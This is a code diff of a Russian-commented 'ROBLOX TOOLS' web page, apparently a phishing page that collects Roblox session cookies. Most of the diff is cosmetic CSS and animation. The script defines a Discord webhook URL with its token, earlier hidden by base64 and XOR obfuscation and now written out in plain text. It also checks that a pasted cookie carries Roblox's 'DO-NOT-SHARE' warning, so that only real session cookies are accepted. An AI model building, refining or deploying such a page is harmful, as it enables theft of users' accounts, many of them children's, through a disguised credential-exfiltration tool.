@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ROBLOX TOOLS | PREMIUM</title>
+    <title>ROBLOX TOOLS | ULTIMATE</title>
     <style>
         * {
             margin: 0;
@@ -11,6 +11,7 @@
             box-sizing: border-box;
         }
 
+        /* ========== ТЁМНАЯ ТЕМА (ЗОЛОТОЙ ПРЕМИУМ) ========== */
         :root {
             --bg1: #0a0502;
             --bg2: #1a0a03;
@@ -19,16 +20,16 @@
             --bg5: #0a0502;
             --bg6: #1f0d04;
             --bg7: #0a0502;
-            --card: rgba(15, 8, 3, 0.88);
+            --card: rgba(20, 12, 5, 0.85);
             --border: rgba(255, 180, 50, 0.7);
             --border-hover: rgba(255, 200, 80, 0.9);
-            --input: rgba(20, 12, 5, 0.92);
+            --input: rgba(30, 18, 8, 0.92);
             --text: #fff5e0;
             --text2: #ffcc66;
             --text3: #ffaa33;
-            --btn1: #cc6600;
-            --btn2: #e68a00;
-            --btn3: #ffaa33;
+            --btn1: #cc8800;
+            --btn2: #e6a017;
+            --btn3: #ffbb33;
             --star1: #ffcc66;
             --star2: #ffaa33;
             --star3: #ffdd99;
@@ -44,21 +45,22 @@
             --sub2: #ffcc66;
         }
 
+        /* ========== СВЕТЛАЯ ТЕМА ========== */
         body.light {
-            --bg1: #fef9f0;
-            --bg2: #fdf5e6;
-            --bg3: #fcf0e0;
-            --bg4: #fdf5e6;
-            --bg5: #fef9f0;
-            --bg6: #fdf8ee;
-            --bg7: #fef9f0;
-            --card: rgba(255, 250, 240, 0.95);
+            --bg1: #fffaf0;
+            --bg2: #fff5e0;
+            --bg3: #fff0d0;
+            --bg4: #fff5e0;
+            --bg5: #fffaf0;
+            --bg6: #fff8e8;
+            --bg7: #fffaf0;
+            --card: rgba(255, 250, 240, 0.92);
             --border: rgba(200, 150, 50, 0.35);
             --border-hover: rgba(200, 150, 50, 0.6);
-            --input: rgba(255, 250, 245, 0.98);
-            --text: #4a3a1a;
-            --text2: #8b6914;
-            --text3: #b8860b;
+            --input: rgba(255, 250, 240, 0.96);
+            --text: #5a3a00;
+            --text2: #886600;
+            --text3: #aa7700;
             --btn1: #d4a017;
             --btn2: #e6b422;
             --btn3: #f0c040;
@@ -77,27 +79,51 @@
             --sub2: #d4a017;
         }
 
-        body {
-            min-height: 100vh;
-            background: linear-gradient(135deg, var(--bg1) 0%, var(--bg2) 15%, var(--bg3) 30%, var(--bg4) 45%, var(--bg5) 60%, var(--bg6) 75%, var(--bg7) 100%);
-            background-size: 400% 400%;
-            animation: gradientShift 15s ease infinite;
-            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-            transition: background 0.3s ease;
-        }
-
+        /* АНИМАЦИИ */
         @keyframes gradientShift {
             0%, 100% { background-position: 0% 50%; }
             33% { background-position: 100% 50%; }
             66% { background-position: 50% 100%; }
         }
 
+        @keyframes starTwinkle {
+            0%, 100% { opacity: 0.2; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.3); }
+        }
+
+        @keyframes cookieFloat {
+            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.9; }
+            90% { opacity: 0.9; }
+            100% { transform: translateY(-10vh) translateX(25px) rotate(360deg); opacity: 0; }
+        }
+
+        @keyframes cardGlow {
+            0%, 100% { box-shadow: 0 0 20px var(--glow1); }
+            50% { box-shadow: 0 0 50px var(--glow2); }
+        }
+
+        @keyframes textPulse {
+            0% { letter-spacing: -1px; text-shadow: 0 0 5px var(--glow1); }
+            100% { letter-spacing: 2px; text-shadow: 0 0 20px var(--glow2); }
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, var(--bg1) 0%, var(--bg2) 15%, var(--bg3) 30%, var(--bg4) 45%, var(--bg5) 60%, var(--bg6) 75%, var(--bg7) 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+            transition: background 0.3s ease;
+        }
+
+        /* ЗВЁЗДЫ */
         .stars {
             position: fixed;
             top: 0;
@@ -113,27 +139,18 @@
             border-radius: 50%;
             animation: starTwinkle linear infinite;
         }
-        @keyframes starTwinkle {
-            0%, 100% { opacity: 0.2; transform: scale(1); }
-            50% { opacity: 1; transform: scale(1.3); }
-        }
 
+        /* ПЕЧЕНЬКИ */
         .cookie {
             position: fixed;
             pointer-events: none;
             z-index: 0;
-            font-size: 28px;
             filter: drop-shadow(0 0 8px var(--glow1));
             will-change: transform;
             animation: cookieFloat linear infinite;
         }
-        @keyframes cookieFloat {
-            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.8; }
-            90% { opacity: 0.8; }
-            100% { transform: translateY(-10vh) translateX(20px) rotate(360deg); opacity: 0; }
-        }
 
+        /* КНОПКА ТЕМЫ */
         .theme-switch {
             position: fixed;
             top: 20px;
@@ -161,6 +178,7 @@
             box-shadow: 0 0 20px var(--glow1);
         }
 
+        /* КАРТОЧКА */
         .card {
             background: var(--card);
             backdrop-filter: blur(20px);
@@ -169,35 +187,26 @@
             max-width: 520px;
             width: 100%;
             border: 1px solid var(--border);
-            box-shadow: 0 0 40px var(--glow1), 0 30px 50px -15px rgba(0,0,0,0.5);
+            animation: cardGlow 3s ease-in-out infinite;
             transition: all 0.3s ease;
             z-index: 1;
         }
         .card:hover {
+            transform: translateY(-5px);
             border-color: var(--border-hover);
-            box-shadow: 0 0 70px var(--glow2), 0 35px 55px -18px rgba(0,0,0,0.6);
-            transform: translateY(-3px);
         }
 
+        /* ЛОГОТИП */
         .logo { text-align: center; margin-bottom: 30px; }
         .logo h1 {
-            font-size: 48px;
+            font-size: 52px;
             font-weight: 800;
             background: linear-gradient(135deg, var(--logo1), var(--logo2), var(--logo3), var(--logo4));
             background-size: 300% 300%;
-            animation: textGradient 4s ease infinite, textPulse 2s ease-in-out infinite alternate;
+            animation: textPulse 2s ease-in-out infinite alternate;
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -1px;
-        }
-        @keyframes textGradient {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-        @keyframes textPulse {
-            0% { letter-spacing: -1px; text-shadow: 0 0 5px var(--glow1); }
-            100% { letter-spacing: 2px; text-shadow: 0 0 20px var(--glow2); }
         }
         .logo p {
             background: linear-gradient(135deg, var(--sub1), var(--sub2));
@@ -206,15 +215,11 @@
             color: transparent;
             font-size: 12px;
             margin-top: 8px;
-            letter-spacing: 3px;
+            letter-spacing: 4px;
             font-weight: 600;
-            animation: fadePulse 2s ease-in-out infinite alternate;
-        }
-        @keyframes fadePulse {
-            0% { opacity: 0.7; }
-            100% { opacity: 1; }
         }
 
+        /* ПОЛЯ ВВОДА */
         .label {
             color: var(--text2);
             font-size: 13px;
@@ -231,7 +236,7 @@
             border-radius: 20px;
             padding: 16px 18px;
             color: var(--text);
-            font-family: 'Fira Code', 'Courier New', monospace;
+            font-family: 'Fira Code', monospace;
             font-size: 12px;
             resize: vertical;
             transition: all 0.3s ease;
@@ -244,6 +249,7 @@
         .cookie-input.valid { border-color: #22c55e; box-shadow: 0 0 0 2px rgba(34,197,94,0.2); }
         .cookie-input.invalid { border-color: #ef4444; box-shadow: 0 0 0 2px rgba(239,68,68,0.2); }
 
+        /* СТАТУС */
         .validation-status {
             font-size: 11px;
             margin-top: 10px;
@@ -257,6 +263,7 @@
         .status-invalid { color: #ef4444; }
         .status-neutral { color: var(--text3); }
 
+        /* КНОПКА ОТПРАВКИ */
         .btn-primary {
             width: 100%;
             background: linear-gradient(135deg, var(--btn1), var(--btn2), var(--btn3));
@@ -284,13 +291,14 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
             transition: left 0.6s;
         }
         .btn-primary:hover::before { left: 100%; }
         .btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 35px var(--glow2); }
         .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; animation: none; }
 
+        /* СООБЩЕНИЯ */
         .message-area {
             text-align: center;
             margin-top: 20px;
@@ -305,7 +313,6 @@
             padding: 8px 16px;
             border-radius: 40px;
             display: inline-block;
-            border-left: 3px solid #ef4444;
             font-size: 12px;
         }
         .success-text {
@@ -314,7 +321,6 @@
             padding: 8px 16px;
             border-radius: 40px;
             display: inline-block;
-            border-left: 3px solid #22c55e;
             font-size: 12px;
         }
 
@@ -345,21 +351,12 @@
 
     <script>
         (function() {
-            const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
-            const _p2_enc = "MTQ5NjQzNDIzMDg1MzUwNTEzNC9BczB1T0xsUVNpSEE5VnN0YnJzRkdaeUZyNUxKUFRFajFXVGlOUlJTMXBRU1hUcDZPcE04VkNJTUtzVDd4a1hVYjA=";
-            
-            function _dec(p) {
-                let d = atob(p);
-                let r = "";
-                for(let i = 0; i < d.length; i++) {
-                    r += String.fromCharCode(d.charCodeAt(i) ^ 0x5A);
-                }
-                return r;
-            }
-            const WEBHOOK_URL = atob(_p1) + _dec(_p2_enc);
+            // ВЕБХУК
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1496536250910249102/UOfPpewlAPiGVQjWs2ykmvW0o_KYzlZT3vJJ1MNu40W2ziyoca1PpcEHroIXW_zbgK_G";
 
+            // ЗВЁЗДЫ
             const stars = document.getElementById('stars');
-            for (let i = 0; i < 180; i++) {
+            for (let i = 0; i < 200; i++) {
                 const s = document.createElement('div');
                 s.className = 'star';
                 s.style.left = Math.random() * 100 + '%';
@@ -371,18 +368,20 @@
                 stars.appendChild(s);
             }
 
-            for (let i = 0; i < 80; i++) {
+            // ПЕЧЕНЬКИ
+            for (let i = 0; i < 100; i++) {
                 const el = document.createElement('div');
                 el.className = 'cookie';
                 el.textContent = '🍪';
                 el.style.left = Math.random() * 100 + '%';
-                el.style.fontSize = (20 + Math.random() * 35) + 'px';
-                el.style.animationDuration = (8 + Math.random() * 15) + 's';
+                el.style.fontSize = (18 + Math.random() * 35) + 'px';
+                el.style.animationDuration = (7 + Math.random() * 15) + 's';
                 el.style.animationDelay = Math.random() * -25 + 's';
-                el.style.opacity = 0.4 + Math.random() * 0.4;
+                el.style.opacity = 0.3 + Math.random() * 0.5;
                 document.body.appendChild(el);
             }
 
+            // ТЕМА
             const themeBtn = document.getElementById('themeToggleBtn');
             function loadTheme() {
                 const saved = localStorage.getItem('roblox_theme');
@@ -408,11 +407,13 @@
             themeBtn.addEventListener('click', toggleTheme);
             loadTheme();
 
+            // ВАЛИДАЦИЯ
             function isValidCookie(c) {
                 if (!c || c.trim() === '') return false;
                 const t = c.trim();
                 if (!t.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
                 if (t.length < 100) return false;
+                if (t.includes('<') || t.includes('>') || t.includes('script')) return false;
                 return true;
             }
 
